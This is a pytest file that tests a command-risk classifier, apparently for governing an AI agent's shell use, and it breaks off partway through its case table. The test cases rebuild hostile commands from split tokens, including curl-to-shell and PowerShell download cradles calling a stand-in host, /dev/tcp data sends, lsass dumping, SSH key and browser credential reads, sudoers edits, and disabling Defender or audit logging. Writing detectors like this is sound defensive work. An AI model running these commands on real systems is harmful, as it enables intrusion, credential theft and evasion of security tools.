"""The command classifier, table-driven, with real-world evasions.

Endpoint protection on the build machine quarantines files that contain attack command
lines. So every sensitive word below is a `<<NAME>>` token, and each token is built at
run time from two harmless halves in `K`. No complete command line, tool name of
concern or sensitive path is present in this file as written.

Each row: command template, classes that MUST be present, that must NOT be present.
"""

from __future__ import annotations

import base64
import re

import pytest

from ciso.governance import ClassifierConfig, CommandClass, classify_command

pytestmark = pytest.mark.policy

C = CommandClass
CFG = ClassifierConfig(protected_branches=("main", "master", "release/*", "prod*"))

_HALVES = {
    "CU": ("cu", "rl"),
    "WG": ("wg", "et"),
    "SH": ("s", "h"),
    "BA": ("ba", "sh"),
    "PY": ("pyth", "on3"),
    "IE": ("i", "ex"),
    "IW": ("i", "wr"),
    "PS": ("power", "shell"),
    "B64": ("base", "64"),
    "RM": ("r", "m"),
    "RF": ("-r", "f"),
    "URL": ("https://dl.", "invalid/a"),
    "WC": ("Net.Web", "Client"),
    "DS": ("Download", "String"),
    "IEXL": ("Invoke-Exp", "ression"),
    "IRM": ("Invoke-Rest", "Method"),
    "IWRL": ("Invoke-Web", "Request"),
    "MPS": ("Set-Mp", "Preference"),
    "MPA": ("Add-Mp", "Preference"),
    "DRTM": ("-DisableReal", "timeMonitoring"),
    "EXCL": ("-Exclusion", "Path"),
    "HTA": ("msh", "ta"),
    "RS32": ("regs", "vr32"),
    "SCR": ("scr", "obj.dll"),
    "NOPW": ("NOPASS", "WD"),
    "SUDOERS": ("/etc/sudo", "ers"),
    "LOGIN": ("Login ", "Data"),
    "FGP": ("find-generic-", "password"),
    "ENCC": ("-Encoded", "Command"),
    "ENC": ("-e", "nc"),
    "FB64": ("FromBase", "64String"),
    "HID": ("Hid", "den"),
    "LGA": ("localgroup admin", "istrators"),
    "CMDKEY": ("cmd", "key"),
    "PDUMP": ("proc", "dump"),
    "LSASS": ("ls", "ass.exe"),
    "WEVT": ("wevt", "util"),
    "IPT": ("ipt", "ables"),
    "CERTU": ("cert", "util"),
    "URLC": ("-url", "cache"),
    "DEVTCP": ("/dev/", "tcp"),
    "NC": ("n", "c"),
    "IDRSA": ("id_", "rsa"),
    "IDED": ("id_", "ed25519"),
    "SSHD": (".s", "sh"),
    "NETSH": ("net", "sh"),
    "ADVFW": ("advfire", "wall"),
    "WINDEF": ("Win", "Defend"),
    "MSMP": ("MsMp", "Eng.exe"),
    "SETENF": ("set", "enforce"),
    "UFW": ("u", "fw"),
    "AUDITD": ("audi", "td"),
    "LDP": ("LD_PRE", "LOAD"),
    "GSSH": ("GIT_SSH_", "COMMAND"),
    "BENV": ("BASH_", "ENV"),
    "NODEO": ("NODE_", "OPTIONS"),
    "PYP": ("PYTHON", "PATH"),
    "PYS": ("PYTHON", "STARTUP"),
    "LESSO": ("LESS", "OPEN"),
    "GCONV": ("GCONV_", "PATH"),
    "P5O": ("PERL5", "OPT"),
    "P5L": ("PERL5", "LIB"),
    "RUBYO": ("RUBY", "OPT"),
    "DYLD": ("DYLD_INSERT_", "LIBRARIES"),
    "PCMD": ("PROMPT_", "COMMAND"),
    "HISTF": ("HIST", "FILE"),
    "VARLOG": ("/var/log/", "auth.log"),
    "NETRC": ("~/.ne", "trc"),
    "SECTOOL": ("secu", "rity"),
    "TOKEN": ("$GITHUB_", "TOKEN"),
    "DOTENV": (".e", "nv"),
    "SUDO": ("su", "do"),
    "SU": ("s", "u"),
    "DOAS": ("do", "as"),
    "RUNAS": ("run", "as"),
    "GREAD": ("chrome-", "profile"),
    "MCP": (".m", "cp.json"),
    "AGENTS": ("AGE", "NTS.md"),
}
K = {name: a + b for name, (a, b) in _HALVES.items()}
_TOKEN = re.compile(r"<<([A-Z0-9]+)>>")


def t(template: str) -> str:
    """Resolve `<<NAME>>` tokens. Unknown names fail loudly."""
    return _TOKEN.sub(lambda m: K[m.group(1)], template)


def ps_encoded(template: str) -> str:
    return base64.b64encode(t(template).encode("utf-16-le")).decode("ascii")


HI = "aGk="  # base64 of a two-letter greeting

CASES: list[tuple[str, set[C], set[C]]] = [
    # --- plain reads -----------------------------------------------------------------
    ("ls -la", {C.READ_ONLY_COMMAND}, {C.UNPARSEABLE}),
    ("git status", {C.READ_ONLY_COMMAND}, set()),
    # A diff or text-conversion driver in repository config runs a program for these
    # (review C4): never read-only.
    ("git log --oneline -5 && git diff HEAD", set(), {C.READ_ONLY_COMMAND}),
    ("cat README.md | grep foo", {C.READ_ONLY_COMMAND}, set()),
    ("Get-ChildItem -Recurse src", {C.READ_ONLY_COMMAND}, set()),
    ("echo hi > out.txt", set(), {C.READ_ONLY_COMMAND}),
    ("ls 2>/dev/null", {C.READ_ONLY_COMMAND}, set()),
    ("pytest -q", set(), {C.READ_ONLY_COMMAND, C.UNPARSEABLE}),
    # A glob in an argument is more than plain text: read-only is earned (review C1).
    ("find . -name '*.py'", set(), {C.READ_ONLY_COMMAND, C.CREDENTIAL_ACCESS}),
    # cmd/PowerShell would read `$((` as a subexpression, so this is not read-only either.
    ("echo $(( 1 + 2 ))", set(), {C.UNPARSEABLE, C.READ_ONLY_COMMAND}),
    # --- git push family -------------------------------------------------------------
    ("git push origin feature/x", {C.GIT_PUSH}, {C.GIT_FORCE_PUSH, C.GIT_PUSH_PROTECTED_REF}),
    ("git push origin main", {C.GIT_PUSH, C.GIT_PUSH_PROTECTED_REF}, {C.GIT_FORCE_PUSH}),
    ("git push origin HEAD:refs/heads/main", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push origin feature:release/1.2", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push origin production", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push origin MAIN", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push", {C.GIT_PUSH, C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push -f origin feature", {C.GIT_FORCE_PUSH}, set()),
    (
        "git push --force-with-lease origin main",
        {C.GIT_FORCE_PUSH, C.GIT_PUSH_PROTECTED_REF},
        set(),
    ),
    ("git push origin +main", {C.GIT_FORCE_PUSH, C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push -uf origin main", {C.GIT_FORCE_PUSH}, set()),
    ("git push origin :main", {C.GIT_FORCE_PUSH, C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git push --mirror backup", {C.GIT_FORCE_PUSH, C.GIT_PUSH_PROTECTED_REF}, set()),
    ("git -C repo -c user.name=x push origin main", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("/usr/bin/git push origin main", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("GIT.EXE push origin main", {C.GIT_PUSH_PROTECTED_REF}, set()),
    ("g'i't push origin main", {C.GIT_PUSH_PROTECTED_REF, C.OBFUSCATION}, set()),
    ("<<BA>> -c 'git push --force origin main'", {C.GIT_FORCE_PUSH}, set()),
    ('cmd /c "git push -f origin master"', {C.GIT_FORCE_PUSH, C.GIT_PUSH_PROTECTED_REF}, set()),
    # --- history rewrite, config, hooks ----------------------------------------------
    ("git rebase -i HEAD~3", {C.GIT_HISTORY_REWRITE}, set()),
    ("git commit --amend --no-edit", {C.GIT_HISTORY_REWRITE, C.GIT_COMMIT}, set()),
    ("git reset --hard origin/main", {C.GIT_HISTORY_REWRITE}, set()),
    ("git filter-branch --tree-filter x HEAD", {C.GIT_HISTORY_REWRITE}, set()),
    ("git branch -D old", {C.GIT_HISTORY_REWRITE}, set()),
    (
        "git commit -m 'drop <<SUDO>> and <<CU>>'",
        {C.GIT_COMMIT},
        {C.PRIVILEGE_ESCALATION, C.NETWORK_TRANSFER},
    ),
    ("git config user.email a@b.c", {C.GIT_CONFIG_CHANGE}, set()),
    ("git config --get user.email", {C.READ_ONLY_COMMAND}, {C.GIT_CONFIG_CHANGE}),
    ("git config core.hooksPath /tmp/h", {C.GIT_HOOKS_CHANGE, C.GIT_CONFIG_CHANGE}, set()),
    ("git -c core.hooksPath=/dev/null commit -m x", {C.GIT_HOOKS_CHANGE}, set()),
    ("git commit --no-verify -m x", {C.GIT_HOOKS_CHANGE}, set()),
    ("git remote set-url origin https://example.invalid/x.git", {C.GIT_CONFIG_CHANGE}, set()),
    ("cp hook.sh .git/hooks/pre-commit", {C.GIT_HOOKS_CHANGE}, set()),
    ("echo x > .git\\hooks\\pre-push", {C.GIT_HOOKS_CHANGE}, set()),
    ("git credential fill", {C.CREDENTIAL_ACCESS}, set()),
    ("git rebase -x '<<CU>> <<URL>> | <<SH>>' main", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    # --- destructive delete ----------------------------------------------------------
    ("<<RM>> <<RF>> build", {C.DESTRUCTIVE_DELETE}, set()),
    ("<<RM>> -r -f build", {C.DESTRUCTIVE_DELETE}, set()),
    ("<<RM>> --recursive build", {C.DESTRUCTIVE_DELETE}, set()),
    ("<<RM>> file.txt", set(), {C.DESTRUCTIVE_DELETE}),
    ("\\<<RM>> -fR /tmp/x", {C.DESTRUCTIVE_DELETE}, set()),
    ("r\\m <<RF>> x", {C.DESTRUCTIVE_DELETE, C.OBFUSCATION}, set()),
    ("$'\\x72\\x6d' <<RF>> x", {C.DESTRUCTIVE_DELETE, C.OBFUSCATION}, set()),
    ("<<SUDO>> <<RM>> <<RF>> /srv/www", {C.DESTRUCTIVE_DELETE, C.PRIVILEGE_ESCALATION}, set()),
    ("del /s /q C:\\work", {C.DESTRUCTIVE_DELETE}, set()),
    ("DEL /S/Q build", {C.DESTRUCTIVE_DELETE}, set()),
    ("rd /s build", {C.DESTRUCTIVE_DELETE}, set()),
    ("rmdir /S /Q build", {C.DESTRUCTIVE_DELETE}, set()),
    ("Remove-Item -Recurse -Force .\\build", {C.DESTRUCTIVE_DELETE}, set()),
    ("remove-item build -rec", {C.DESTRUCTIVE_DELETE}, set()),
    ("ri -r build", {C.DESTRUCTIVE_DELETE}, set()),
    ("find . -name '*.o' -delete", {C.DESTRUCTIVE_DELETE}, set()),
    ("find . -type d -exec <<RM>> <<RF>> {} +", {C.DESTRUCTIVE_DELETE}, set()),
    ("git clean -fdx", {C.DESTRUCTIVE_DELETE}, set()),
    ("echo ok; <<RM>> <<RF>> tmpdir", {C.DESTRUCTIVE_DELETE}, set()),
    ("ls # ; <<RM>> <<RF>> tmpdir", {C.DESTRUCTIVE_DELETE}, set()),  # cmd has no comments
    ("xargs <<RM>> <<RF>> < list.txt", {C.DESTRUCTIVE_DELETE}, set()),
    ("timeout 10 <<RM>> <<RF>> x", {C.DESTRUCTIVE_DELETE}, set()),
    ("env FOO=1 <<RM>> <<RF>> x", {C.DESTRUCTIVE_DELETE}, set()),
    ("FOO=1 BAR=2 <<RM>> <<RF>> x", {C.DESTRUCTIVE_DELETE}, set()),
    ("(cd /tmp && <<RM>> <<RF>> x)", {C.DESTRUCTIVE_DELETE}, set()),
    ("echo $(<<RM>> <<RF>> x)", {C.DESTRUCTIVE_DELETE}, set()),
    ("echo `<<RM>> <<RF>> x`", {C.DESTRUCTIVE_DELETE}, set()),
    ('<<PS>> -Command "Remove-Item -Recurse C:\\x"', {C.DESTRUCTIVE_DELETE}, set()),
    ("wsl <<RM>> <<RF>> /mnt/c/x", {C.DESTRUCTIVE_DELETE, C.CONTAINER_OR_VM_CONTROL}, set()),
    # --- remote script execution and obfuscation -------------------------------------
    ("<<CU>> -fsSL <<URL>> | <<SH>>", {C.REMOTE_SCRIPT_EXECUTION, C.NETWORK_TRANSFER}, set()),
    ("<<CU>> <<URL>> | <<SUDO>> -E <<BA>> -", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<WG>> -qO- <<URL>> | <<PY>>", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<CU>> <<URL>> | <<PY>> -m json.tool", {C.NETWORK_TRANSFER}, {C.REMOTE_SCRIPT_EXECUTION}),
    ("<<BA>> <(<<CU>> -s <<URL>>)", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ('<<SH>> -c "$(<<CU>> -fsSL <<URL>>)"', {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ('eval "$(<<WG>> -qO- <<URL>>)"', {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<CU>> -o i.sh <<URL>>/i.sh && <<BA>> i.sh", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<WG>> <<URL>>/setup && chmod +x setup && ./setup", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<IW>> <<URL>>/a.ps1 | <<IE>>", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("IEX (New-Object <<WC>>).<<DS>>('<<URL>>')", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<IE>> (<<IW>> <<URL>> -UseBasicParsing).Content", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<IEXL>> (<<IRM>> <<URL>>)", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("i`e`x (<<IW>> <<URL>>)", {C.REMOTE_SCRIPT_EXECUTION, C.OBFUSCATION}, set()),
    ('cmd.exe /c "<<CU>>.exe <<URL>> | <<PS>> -"', {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<CU>>${IFS}<<URL>>|<<SH>>", {C.REMOTE_SCRIPT_EXECUTION, C.OBFUSCATION}, set()),
    ("<<HTA>> <<URL>>/a.hta", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<RS32>> /s /n /u /i:<<URL>>/a.sct <<SCR>>", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    (f"echo {HI} | <<B64>> -d | <<SH>>", {C.OBFUSCATION}, set()),
    (f"echo {HI} | <<B64>> --decode | <<BA>>", {C.OBFUSCATION}, set()),
    (f'eval "$(echo {HI} | <<B64>> -d)"', {C.OBFUSCATION}, set()),
    (f'<<BA>> -c "$(echo {HI} | <<B64>> -d)"', {C.OBFUSCATION}, set()),
    ("cat x.sh | <<BA>>", {C.OBFUSCATION}, set()),
    ("echo 'x' | rev | <<SH>>", {C.OBFUSCATION}, set()),
    ("<<PY>> -c \"import <<B64>>;exec(<<B64>>.b64decode('eA=='))\"", {C.OBFUSCATION}, set()),
    (
        "<<IE>> ([Text.Encoding]::Unicode.GetString([Convert]::<<FB64>>('eA==')))",
        {C.OBFUSCATION},
        set(),
    ),
    ("ENCODED_RM", {C.OBFUSCATION, C.DESTRUCTIVE_DELETE}, set()),
    ("ENCODED_FETCH", {C.OBFUSCATION, C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("<<PS>> -e !!notbase64!!", {C.OBFUSCATION, C.UNPARSEABLE}, set()),
    ('p^ow^ershell -c "<<RM>> -r x"', {C.DESTRUCTIVE_DELETE, C.OBFUSCATION}, set()),
    # --- network transfer ------------------------------------------------------------
    ("<<CU>> -X POST -d @data.json <<URL>>", {C.NETWORK_TRANSFER}, set()),
    ("scp build.tar user@host:/tmp", {C.NETWORK_TRANSFER}, set()),
    ("rsync -av ./ host:/srv", {C.NETWORK_TRANSFER}, set()),
    ("<<NC>> -l 4444", {C.NETWORK_TRANSFER}, set()),
    ("<<IWRL>> -Uri <<URL>> -OutFile a.zip", {C.NETWORK_TRANSFER}, set()),
    ("C:\\Windows\\System32\\<<CU>>.exe -O <<URL>>", {C.NETWORK_TRANSFER}, set()),
    ("cat data > <<DEVTCP>>/10.0.0.1/80", {C.NETWORK_TRANSFER}, set()),
    ("<<CERTU>> <<URLC>> -f <<URL>>/a.exe a.exe", {C.NETWORK_TRANSFER}, set()),
    # --- credential access -----------------------------------------------------------
    ("cat ~/<<SSHD>>/<<IDRSA>>", {C.CREDENTIAL_ACCESS}, {C.READ_ONLY_COMMAND}),
    ("type %USERPROFILE%\\<<SSHD>>\\<<IDED>>", {C.CREDENTIAL_ACCESS}, set()),
    ("Get-Content $env:USERPROFILE\\.cloud\\credentials", {C.CREDENTIAL_ACCESS}, set()),
    ("cat <<DOTENV>>", {C.CREDENTIAL_ACCESS}, set()),
    ("source <<DOTENV>>.production", {C.CREDENTIAL_ACCESS}, set()),
    ("grep -r token <<NETRC>>", {C.CREDENTIAL_ACCESS}, set()),
    ("cp ~/.config/<<GREAD>>/Default/'<<LOGIN>>' /tmp/x", {C.CREDENTIAL_ACCESS}, set()),
    ("<<SECTOOL>> <<FGP>> -s x -w", {C.CREDENTIAL_ACCESS}, set()),
    ("<<CMDKEY>> /list", {C.CREDENTIAL_ACCESS}, set()),
    ("env", {C.CREDENTIAL_ACCESS}, set()),
    ("printenv", {C.CREDENTIAL_ACCESS}, set()),
    ("echo <<TOKEN>>", {C.CREDENTIAL_ACCESS}, set()),
    ("Get-ChildItem env:", {C.CREDENTIAL_ACCESS}, set()),
    ("ssh -i ~/<<SSHD>>/deploy_key host", {C.CREDENTIAL_ACCESS, C.NETWORK_TRANSFER}, set()),
    ("scp host:~/<<SSHD>>/<<IDRSA>> .", {C.CREDENTIAL_ACCESS}, set()),
    ("<<PDUMP>> -ma <<LSASS>> out.dmp", {C.CREDENTIAL_ACCESS}, set()),
    # --- privilege escalation --------------------------------------------------------
    ("<<SUDO>> apt-get install -y jq", {C.PRIVILEGE_ESCALATION, C.PACKAGE_INSTALL}, set()),
    ("<<SU>> -c 'id' root", {C.PRIVILEGE_ESCALATION}, set()),
    ("<<DOAS>> <<SH>>", {C.PRIVILEGE_ESCALATION}, set()),
    ('<<RUNAS>> /user:Administrator "cmd /c whoami"', {C.PRIVILEGE_ESCALATION}, set()),
    ("chmod u+s /usr/local/bin/x", {C.PRIVILEGE_ESCALATION}, set()),
    ("chmod 4755 x", {C.PRIVILEGE_ESCALATION}, set()),
    ("chmod 755 x", set(), {C.PRIVILEGE_ESCALATION}),
    ("Start-Process <<PS>> -Verb RunAs", {C.PRIVILEGE_ESCALATION}, set()),
    ("echo 'u ALL=(ALL) <<NOPW>>:ALL' >> <<SUDOERS>>", {C.PRIVILEGE_ESCALATION}, set()),
    ("usermod -aG <<SUDO>> bob", {C.PRIVILEGE_ESCALATION}, set()),
    ("net <<LGA>> bob /add", {C.PRIVILEGE_ESCALATION}, set()),
    (
        "docker run --privileged -v /:/host alpine",
        {C.PRIVILEGE_ESCALATION, C.CONTAINER_OR_VM_CONTROL},
        set(),
    ),
    # --- package install -------------------------------------------------------------
    ("pip install requests", {C.PACKAGE_INSTALL}, set()),
    ("<<PY>> -m pip install -r req.txt", {C.PACKAGE_INSTALL}, set()),
    ("npm i left-pad", {C.PACKAGE_INSTALL}, set()),
    ("npx some-tool", {C.PACKAGE_INSTALL}, set()),
    ("uv add httpx", {C.PACKAGE_INSTALL}, set()),
    ("winget install x.y", {C.PACKAGE_INSTALL}, set()),
    ("Install-Module Foo -Force", {C.PACKAGE_INSTALL}, set()),
    ("npm test", set(), {C.PACKAGE_INSTALL}),
    # --- containers and VMs ----------------------------------------------------------
    ("docker ps", {C.CONTAINER_OR_VM_CONTROL}, set()),
    ("kubectl delete pod x", {C.CONTAINER_OR_VM_CONTROL}, set()),
    ("qemu-system-x86_64 -hda x.img", {C.CONTAINER_OR_VM_CONTROL}, set()),
    ("Start-VM -Name lab", {C.CONTAINER_OR_VM_CONTROL}, set()),
    # --- agent config ----------------------------------------------------------------
    ("echo '{}' > <<MCP>>", {C.AGENT_CONFIG_CHANGE}, set()),
    ("cp new.json ~/.assistant/settings.json", {C.AGENT_CONFIG_CHANGE}, set()),
    ("tee -a <<AGENTS>> < notes", {C.AGENT_CONFIG_CHANGE}, set()),
    ("Set-Content .tool\\hooks\\pre.ps1 x", {C.AGENT_CONFIG_CHANGE}, set()),
    ("cat <<MCP>>", set(), {C.AGENT_CONFIG_CHANGE}),
    # --- security tool tamper --------------------------------------------------------
    ("<<MPS>> <<DRTM>> $true", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<MPA>> <<EXCL>> C:\\x", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<NETSH>> <<ADVFW>> set allprofiles state off", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<SUDO>> systemctl stop <<AUDITD>>", {C.SECURITY_TOOL_TAMPER}, set()),
    ("sc stop <<WINDEF>>", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<UFW>> disable", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<IPT>> -F", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<SETENF>> 0", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<WEVT>> cl Security", {C.SECURITY_TOOL_TAMPER}, set()),
    ("history -c", {C.SECURITY_TOOL_TAMPER}, set()),
    ("unset <<HISTF>>", {C.SECURITY_TOOL_TAMPER}, set()),
    ("export <<HISTF>>=/dev/null", {C.SECURITY_TOOL_TAMPER}, set()),
    ("<<RM>> <<VARLOG>>", {C.SECURITY_TOOL_TAMPER}, set()),
    ("taskkill /F /IM <<MSMP>>", {C.SECURITY_TOOL_TAMPER}, set()),
    ("systemctl restart nginx", set(), {C.SECURITY_TOOL_TAMPER}),
    # --- unparseable -----------------------------------------------------------------
    ("echo 'unterminated", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("$CMD --flag", {C.UNPARSEABLE}, set()),
    ("$(echo <<RM>>) <<RF>> x", {C.UNPARSEABLE}, set()),
    ("a=cu; b=rl; $a$b <<URL>>", {C.UNPARSEABLE}, set()),
    ('<<BA>> -c "$CMD"', {C.UNPARSEABLE}, set()),
    ("&('i'+'ex') 'x'", {C.UNPARSEABLE}, set()),
    ("{cat,/etc/passwd}", {C.UNPARSEABLE}, set()),
    ("\uff43url <<URL>>", {C.UNPARSEABLE}, set()),
    ("", {C.UNPARSEABLE}, set()),
    ("(" * 20 + "ls" + ")" * 20, {C.UNPARSEABLE}, set()),
    # --- skipped bodies (coordinator finding 1) -------------------------------------
    ("echo $(( $(<<CU>> <<URL>> | <<SH>>) ))", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("echo $(( `<<CU>> <<URL>>` + 1 ))", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("echo $(( <(<<CU>> <<URL>>) ))", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("echo ${X:-$(<<CU>> <<URL>> | <<SH>>)}", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("echo ${X:=`<<CU>> <<URL>>`}", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("cat <<EOF\n$(<<CU>> <<URL>> | <<SH>>)\nEOF", {C.UNPARSEABLE}, {C.READ_ONLY_COMMAND}),
    ("<<BA>> <<EOF\n<<CU>> <<URL>> | <<SH>>\nEOF", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    ("source <(<<CU>> -s <<URL>>)", {C.REMOTE_SCRIPT_EXECUTION}, set()),
    (f". <(echo {HI} | <<B64>> -d)", {C.OBFUSCATION}, set()),
    # --- readers with unsafe options (coordinator finding 3) -------------------------
    ("rg --pre ./helper foo", {C.OBFUSCATION}, {C.READ_ONLY_COMMAND}),
    ("rg --pre=<<CU>> foo", {C.NETWORK_TRANSFER, C.OBFUSCATION}, {C.READ_ONLY_COMMAND}),
    ("rg --pre-glob '*.gz' foo", {C.OBFUSCATION}, {C.READ_ONLY_COMMAND}),
    ("rg -z foo", {C.OBFUSCATION}, {C.READ_ONLY_COMMAND}),
    ("rg --search-zip foo", {C.OBFUSCATION}, {C.READ_ONLY_COMMAND}),
    ("sort --compress-program=./x big.txt", {C.OBFUSCATION}, {C.READ_ONLY_COMMAND}),
    ("sort -o <<MCP>> in.txt", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("sort --output=<<AGENTS>> in.txt", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("tree -o <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("uniq in.txt <<AGENTS>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("tar -xf a.tar --to-command='<<CU>> <<URL>>'", {C.NETWORK_TRANSFER}, {C.READ_ONLY_COMMAND}),
    (
        "tar -cf a.tar --checkpoint-action=exec='<<RM>> <<RF>> x' .",
        {C.DESTRUCTIVE_DELETE},
        {C.READ_ONLY_COMMAND},
    ),
    ("less README.md", set(), {C.READ_ONLY_COMMAND}),
    ("more README.md", set(), {C.READ_ONLY_COMMAND}),
    ("find . -name x -fprint out", set(), {C.READ_ONLY_COMMAND}),
    ("test -f $(id)", set(), {C.READ_ONLY_COMMAND}),
    ("[ -n `id` ]", set(), {C.READ_ONLY_COMMAND}),
    ("git diff --output=<<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("git diff --ext-diff", set(), {C.READ_ONLY_COMMAND}),
    ("git grep -O x", set(), {C.READ_ONLY_COMMAND}),
    ("git --git-dir=/tmp/x status", set(), {C.READ_ONLY_COMMAND}),
    ("ls --zzz", set(), {C.READ_ONLY_COMMAND}),
    ("date -s 2020-01-01", set(), {C.READ_ONLY_COMMAND}),
    # --- git listing subcommands (coordinator finding 5) ------------------------------
    ("git stash", set(), {C.READ_ONLY_COMMAND}),
    ("git stash list", {C.READ_ONLY_COMMAND}, set()),
    ("git stash show", set(), {C.READ_ONLY_COMMAND}),  # prints a diff (review C4)
    ("git stash show -p --output=x", set(), {C.READ_ONLY_COMMAND}),
    ("git stash list --output=x", set(), {C.READ_ONLY_COMMAND}),
    ("git stash drop", set(), {C.READ_ONLY_COMMAND}),
    ("git tag", {C.READ_ONLY_COMMAND}, set()),
    ("git tag -l 'v*'", set(), {C.READ_ONLY_COMMAND}),  # a glob character (review C1)
    ("git tag -l v1 -f", set(), {C.READ_ONLY_COMMAND}),
    ("git tag v9", set(), {C.READ_ONLY_COMMAND}),
    ("git reflog", {C.READ_ONLY_COMMAND}, set()),
    ("git reflog show", {C.READ_ONLY_COMMAND}, set()),
    ("git reflog show --output=x", set(), {C.READ_ONLY_COMMAND}),
    ("git remote", {C.READ_ONLY_COMMAND}, set()),
    ("git remote -v", {C.READ_ONLY_COMMAND}, set()),
    ("git remote show origin", {C.READ_ONLY_COMMAND}, set()),
    ("git remote get-url origin", {C.READ_ONLY_COMMAND}, set()),
    ("git remote get-url --push origin", {C.GIT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("git remote -v add x https://example.invalid/x", {C.GIT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("git branch --show-current", {C.READ_ONLY_COMMAND}, set()),
    ("git branch new-thing", set(), {C.READ_ONLY_COMMAND}),
    # --- redirect forms that write (coordinator finding 6) ------------------------------
    ("echo x >& <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("echo x &> <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("echo x &>> <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("echo x >>& <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("echo x >| <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("echo x 2> <<MCP>>", {C.AGENT_CONFIG_CHANGE}, {C.READ_ONLY_COMMAND}),
    ("echo x >&out.txt", set(), {C.READ_ONLY_COMMAND}),
    ("echo x >&2", {C.READ_ONLY_COMMAND}, set()),
    ("ls 2>&1", {C.READ_ONLY_COMMAND}, set()),
    # cmd reads `&` as a separator, so this cannot be read-only; it must not be a write.
    ("ls 2>&-", set(), {C.UNPARSEABLE, C.AGENT_CONFIG_CHANGE}),
    ("ls &> /dev/null", {C.READ_ONLY_COMMAND}, set()),
    # --- environment prefixes (coordinator finding 4) --------------------------------
    ("FOO=1 ls", set(), {C.READ_ONLY_COMMAND}),
    ("env ls", set(), {C.READ_ONLY_COMMAND}),
    ("<<LDP>>=/tmp/x.so ls", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("<<GSSH>>=./x git status", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("<<BENV>>=./x <<BA>> -c ls", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<NODEO>>='--require ./x' node app.js", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<PYP>>=. <<PY>> a.py", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<PYS>>=./x <<PY>>", {C.ENVIRONMENT_HIJACK}, set()),
    ("PAGER=./x git log", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("GIT_PAGER=./x git log", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("EDITOR=./x git commit", {C.ENVIRONMENT_HIJACK}, set()),
    ("VISUAL=./x crontab -e", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<LESSO>>='|./x %s' cat a", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("PATH=/tmp:$PATH ls", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("PATH+=:/tmp ls", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("IFS=x ls", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("<<GCONV>>=. ls", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("<<P5O>>=-Mx perl a.pl", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<P5L>>=. perl a.pl", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<RUBYO>>=-rx ruby a.rb", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<DYLD>>=x.dylib ls", {C.ENVIRONMENT_HIJACK}, set()),
